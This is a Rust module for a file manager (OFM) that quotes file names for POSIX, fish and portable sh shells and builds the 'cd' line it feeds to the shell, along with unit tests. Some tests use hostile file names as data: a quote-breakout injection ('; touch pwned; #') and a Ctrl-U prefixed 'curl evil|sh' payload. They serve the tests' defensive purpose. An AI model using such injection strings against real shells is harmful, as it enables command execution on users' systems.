//! Shell quoting on bytes (POSIX and fish) and the exact `cd` command OFM feeds to the shell
//! (ADR-0003).
//!
//! Two hazards drive the design:
//! - fish is not POSIX: inside its single quotes `\\` and `\'` are escapes, so the POSIX
//!   `'\''` idiom lets a name like `\'; touch pwned; #` break out of the quotes;
//! - the line editors (readline, zle, fish's reader) act on control bytes even inside quotes
//!   (a name holding Ctrl-U kills the line being typed), so names with control bytes are
//!   never fed as plain text.

use std::ffi::OsStr;
use std::path::Path;

use super::bytes_of;

/// Which shell family a quoted word is destined for.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum QuoteStyle {
    /// bash, zsh, dash, ksh, …: `'…'` with the `'\''` idiom; ANSI-C `$'…'` for control and
    /// non-UTF-8 bytes.
    #[default]
    Posix,
    /// fish: `'…'` with `\\` and `\'` escapes; `\xNN` outside the quotes for control and
    /// non-UTF-8 bytes.
    Fish,
    /// Any POSIX `sh` that may be dash, busybox ash, …: only `'…'` with `'` → `'\''` and
    /// `"$(printf '\NNN')"` octal runs, never `$'…'` (dash does not know ANSI-C quoting and
    /// would read `$'a\'; cmd; #'` as `$'a\'` followed by live code). Use it for every
    /// command run through `/bin/sh -c` and for terminal shells that are not bash/zsh/fish.
    /// Prefer [`shell_quote_bytes_for`], which keeps non-UTF-8 names as raw bytes inside `'…'`.
    PortableSh,
}

/// Whether `bytes` contain a control byte (`0x00..=0x1f` or `0x7f`). Terminal line editors
/// interpret those as key presses even inside quotes, so a text holding one must never be
/// fed to a shell verbatim.
pub fn has_control_bytes(bytes: &[u8]) -> bool {
    bytes.iter().any(|&b| b < 0x20 || b == 0x7f)
}

/// Quote `bytes` in POSIX single-quote form: wrapped in `'…'`, each `'` becomes `'\''`.
/// Any byte passes through unchanged inside the quotes, so non-UTF-8 names survive exactly
/// (round-trips through every POSIX shell; see the proptests for the reference un-quoter).
/// Control bytes pass through too: do not feed the result to a terminal when
/// [`has_control_bytes`] holds — use [`shell_quote_for`] / [`cd_command_for`] instead.
pub fn shell_quote_bytes(bytes: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(bytes.len() + 2);
    out.push(b'\'');
    for &b in bytes {
        if b == b'\'' {
            out.extend_from_slice(b"'\\''");
        } else {
            out.push(b);
        }
    }
    out.push(b'\'');
    out
}

/// Quote `bytes` for fish: wrapped in `'…'`, with `\` → `\\` and `'` → `\'` (the only two
/// escapes fish knows inside single quotes). Every other byte is literal, so this is byte
/// exact — but, as with [`shell_quote_bytes`], not terminal-safe when [`has_control_bytes`].
pub fn fish_quote_bytes(bytes: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(bytes.len() + 2);
    out.push(b'\'');
    for &b in bytes {
        if b == b'\'' || b == b'\\' {
            out.push(b'\\');
        }
        out.push(b);
    }
    out.push(b'\'');
    out
}

/// [`shell_quote_for`] in the POSIX style, for widgets that hold UTF-8 text (the command line).
pub fn shell_quote(name: &OsStr) -> String {
    shell_quote_for(QuoteStyle::Posix, name)
}

/// Quote `name` as one shell word that can be typed into the command line and fed to a shell.
/// The result is always printable text — control bytes never appear raw — so it can neither
/// confuse the line editor nor the entry widget.
///
/// - [`QuoteStyle::Posix`]: plain `'…'` when `name` is valid UTF-8 without control bytes;
///   otherwise ANSI-C `$'…'` escaping every non-ASCII byte, `'`, `\` and control byte as
///   `\xNN` (bash, zsh and ksh expand it back to the exact bytes).
/// - [`QuoteStyle::Fish`]: `'…'` with fish escapes; control bytes and invalid UTF-8 bytes
///   become `\xNN` *outside* the quotes (`'a'\x15'b'`).
pub fn shell_quote_for(style: QuoteStyle, name: &OsStr) -> String {
    let bytes = bytes_of(name);
    match style {
        QuoteStyle::Posix => posix_quote_string(&bytes),
        QuoteStyle::Fish => fish_quote_string(&bytes),
        QuoteStyle::PortableSh => portable_quote_string(&bytes),
    }
}

/// Like [`shell_quote_for`] but as bytes, for text that goes to a process rather than a
/// widget. For [`QuoteStyle::PortableSh`] this is [`shell_quote_bytes`]: byte-exact `'…'`, no
/// escapes at all (callers must refuse control bytes first, see [`has_control_bytes`]); the
/// other styles return the UTF-8 text of [`shell_quote_for`].
pub fn shell_quote_bytes_for(style: QuoteStyle, name: &OsStr) -> Vec<u8> {
    match style {
        QuoteStyle::PortableSh => shell_quote_bytes(&bytes_of(name)),
        _ => shell_quote_for(style, name).into_bytes(),
    }
}

/// Portable-sh quoting as printable text: valid UTF-8 without control bytes stays in `'…'`;
/// every other byte run becomes `"$(printf '\NNN…')"` (octal only, so nothing in it is
/// special). `printf` is a builtin in dash and bash; command substitution only drops trailing
/// newlines, which a name ending in a newline loses (such names are refused before they get
/// here when they run; on the command line it is the typed text the user sees).
fn portable_quote_string(bytes: &[u8]) -> String {
    fn flush_run(out: &mut String, run: &mut Vec<u8>) {
        if run.is_empty() {
            return;
        }
        out.push_str("\"$(printf '");
        for &b in run.iter() {
            out.push_str(&format!("\\{b:03o}"));
        }
        out.push_str("')\"");
        run.clear();
    }
    fn flush_lit(out: &mut String, lit: &mut String) {
        if !lit.is_empty() {
            out.push('\'');
            out.push_str(&lit.replace('\'', "'\\''"));
            out.push('\'');
            lit.clear();
        }
    }
    let mut out = String::with_capacity(bytes.len() + 8);
    let mut lit = String::new();
    let mut run: Vec<u8> = Vec::new();
    for chunk in bytes.utf8_chunks() {
        for c in chunk.valid().chars() {
            if c.is_ascii_control() {
                flush_lit(&mut out, &mut lit);
                run.push(c as u8);
            } else {
                flush_run(&mut out, &mut run);
                lit.push(c);
            }
        }
        if !chunk.invalid().is_empty() {
            flush_lit(&mut out, &mut lit);
            run.extend_from_slice(chunk.invalid());
        }
    }
    flush_lit(&mut out, &mut lit);
    flush_run(&mut out, &mut run);
    if out.is_empty() {
        out.push_str("''");
    }
    out
}

fn posix_quote_string(bytes: &[u8]) -> String {
    if !has_control_bytes(bytes)
        && let Ok(s) = std::str::from_utf8(bytes)
    {
        let mut out = String::with_capacity(s.len() + 2);
        out.push('\'');
        for c in s.chars() {
            if c == '\'' {
                out.push_str("'\\''");
            } else {
                out.push(c);
            }
        }
        out.push('\'');
        return out;
    }
    let mut out = String::with_capacity(bytes.len() + 8);
    out.push_str("$'");
    for &b in bytes {
        match b {
            b'\'' => out.push_str("\\'"),
            b'\\' => out.push_str("\\\\"),
            0x00..=0x1f | 0x7f..=0xff => out.push_str(&format!("\\x{b:02x}")),
            _ => out.push(b as char), // printable ASCII
        }
    }
    out.push('\'');
    out
}

fn fish_quote_string(bytes: &[u8]) -> String {
    /// Append `c` inside a `'…'` run, opening it when needed.
    fn literal(out: &mut String, open: &mut bool, c: char) {
        if !*open {
            out.push('\'');
            *open = true;
        }
        if c == '\'' || c == '\\' {
            out.push('\\');
        }
        out.push(c);
    }
    /// Append byte `b` as `\xNN` outside any quotes, closing the run first.
    fn escape(out: &mut String, open: &mut bool, b: u8) {
        if *open {
            out.push('\'');
            *open = false;
        }
        out.push_str(&format!("\\x{b:02x}"));
    }

    let mut out = String::with_capacity(bytes.len() + 8);
    let mut open = false;
    for chunk in bytes.utf8_chunks() {
        for c in chunk.valid().chars() {
            if c.is_ascii_control() {
                escape(&mut out, &mut open, c as u8);
            } else {
                literal(&mut out, &mut open, c);
            }
        }
        for &b in chunk.invalid() {
            escape(&mut out, &mut open, b);
        }
    }
    if open {
        out.push('\'');
    } else if out.is_empty() {
        out.push_str("''");
    }
    out
}

/// The exact bytes OFM feeds to an idle shell to move it to `path`:
/// `" cd -- '<quoted>'\n"` (ADR-0003), quoted for `style`. The leading space keeps the line
/// out of the shell history (`HISTCONTROL=ignorespace` is set by the injected rc snippet);
/// `--` protects against paths that look like options; the quoting is byte-exact.
///
/// `None` when the path contains a control byte ([`has_control_bytes`]): the line editor
/// would interpret it even inside quotes (Ctrl-U, Ctrl-C, …), so such a directory is never
/// synced and the caller skips the sync.
pub fn cd_command_for(style: QuoteStyle, path: &Path) -> Option<Vec<u8>> {
    let bytes = bytes_of(path.as_os_str());
    if has_control_bytes(&bytes) {
        return None;
    }
    let mut out = Vec::with_capacity(bytes.len() + 16);
    out.extend_from_slice(b" cd -- ");
    match style {
        QuoteStyle::Posix => out.extend_from_slice(&shell_quote_bytes(&bytes)),
        QuoteStyle::Fish => out.extend_from_slice(&fish_quote_bytes(&bytes)),
        QuoteStyle::PortableSh => out.extend_from_slice(&shell_quote_bytes(&bytes)),
    }
    out.push(b'\n');
    Some(out)
}

/// [`cd_command_for`] in the POSIX style (bash, zsh, …).
pub fn cd_command(path: &Path) -> Option<Vec<u8>> {
    cd_command_for(QuoteStyle::Posix, path)
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use std::ffi::OsStr;
    use std::path::Path;

    use super::*;

    #[cfg(unix)]
    fn os(bytes: &[u8]) -> std::ffi::OsString {
        std::os::unix::ffi::OsStringExt::from_vec(bytes.to_vec())
    }

    #[test]
    fn quote_basics() {
        assert_eq!(shell_quote_bytes(b"plain"), b"'plain'");
        assert_eq!(shell_quote_bytes(b"it's"), b"'it'\\''s'");
        assert_eq!(shell_quote_bytes(b""), b"''");
        assert_eq!(shell_quote_bytes(b"a b\tc"), b"'a b\tc'");
        assert_eq!(shell_quote(OsStr::new("it's")), "'it'\\''s'");
    }

    #[test]
    #[cfg(unix)]
    fn quote_non_utf8_bytes_exact() {
        let name = os(&[0xff, b'a', 0xfe]);
        assert_eq!(shell_quote_bytes(&os_to_bytes(&name)), b"'\xffa\xfe'");
        // The String form falls back to ANSI-C quoting and round-trips byte-exactly in bash/zsh.
        assert_eq!(shell_quote(&name), "$'\\xffa\\xfe'");
    }

    #[cfg(unix)]
    fn os_to_bytes(s: &OsStr) -> Vec<u8> {
        std::os::unix::ffi::OsStrExt::as_bytes(s).to_vec()
    }

    #[test]
    #[cfg(unix)]
    fn posix_control_bytes_become_ansi_c_escapes() {
        // Raw control bytes would reach readline/zle (Ctrl-U kills the line): always escaped.
        let name = os(b"\x15curl evil|sh\n");
        assert_eq!(shell_quote(&name), "$'\\x15curl evil|sh\\x0a'");
        assert_eq!(shell_quote(&os(b"a\x7fb")), "$'a\\x7fb'");
        assert_eq!(shell_quote(&os(b"nul\0nl\n")), "$'nul\\x00nl\\x0a'");
        assert_eq!(shell_quote(&os(b"it's\x1b")), "$'it\\'s\\x1b'");
        assert!(
            !shell_quote(&name).bytes().any(|b| b < 0x20 || b == 0x7f),
            "quoted text must be printable"
        );
    }

    #[test]
    fn fish_quote_escapes() {
        assert_eq!(fish_quote_bytes(b"plain"), b"'plain'");
        assert_eq!(fish_quote_bytes(b"it's"), b"'it\\'s'");
        assert_eq!(fish_quote_bytes(b"a\\b"), b"'a\\\\b'");
        // The reviewer's attack: must not break out of the quotes.
        assert_eq!(
            fish_quote_bytes(b"\\'; touch pwned; #"),
            b"'\\\\\\'; touch pwned; #'"
        );
        assert_eq!(fish_quote_bytes(b""), b"''");
        assert_eq!(shell_quote_for(QuoteStyle::Fish, OsStr::new("")), "''");
        assert_eq!(
            shell_quote_for(QuoteStyle::Fish, OsStr::new("a b$c")),
            "'a b$c'"
        );
    }

    #[test]
    #[cfg(unix)]
    fn fish_string_form_escapes_control_and_invalid_bytes_outside_quotes() {
        let f = |b: &[u8]| shell_quote_for(QuoteStyle::Fish, &os(b));
        assert_eq!(f(b"a\x15b"), "'a'\\x15'b'");
        assert_eq!(f(b"\x15"), "\\x15");
        assert_eq!(f(b"x\n"), "'x'\\x0a");
        assert_eq!(f(b"\xffa"), "\\xff'a'");
        assert_eq!(f(b"it's\x1b"), "'it\\'s'\\x1b");
        assert_eq!(f("київ".as_bytes()), "'київ'");
    }

    #[test]
    fn cd_command_format() {
        let cmd = cd_command(Path::new("/tmp/my dir")).unwrap();
        assert_eq!(cmd, b" cd -- '/tmp/my dir'\n");
        let cmd = cd_command(Path::new("/x'")).unwrap();
        assert_eq!(cmd, b" cd -- '/x'\\'''\n");
    }

    #[test]
    fn cd_command_for_fish() {
        let cmd = cd_command_for(QuoteStyle::Fish, Path::new("/x/\\'; touch pwned; #")).unwrap();
        assert_eq!(cmd, b" cd -- '/x/\\\\\\'; touch pwned; #'\n");
        let cmd = cd_command_for(QuoteStyle::Fish, Path::new("/tmp/my dir")).unwrap();
        assert_eq!(cmd, b" cd -- '/tmp/my dir'\n");
    }

    #[test]
    #[cfg(unix)]
    fn cd_command_refuses_control_bytes() {
        for bad in [
            &b"/x/\x15curl evil|sh\n"[..],
            b"/x/\x03",
            b"/x/a\x7f",
            b"/x/\x1b[A",
        ] {
            let p = std::path::PathBuf::from(os(bad));
            assert_eq!(cd_command(&p), None, "{bad:?}");
            assert_eq!(cd_command_for(QuoteStyle::Fish, &p), None, "{bad:?}");
        }
        // Non-UTF-8 high bytes are fine (no key meaning in a UTF-8 terminal).
        let p = std::path::PathBuf::from(os(b"/x/\xff"));
        assert_eq!(cd_command(&p).unwrap(), b" cd -- '/x/\xff'\n");
    }
}
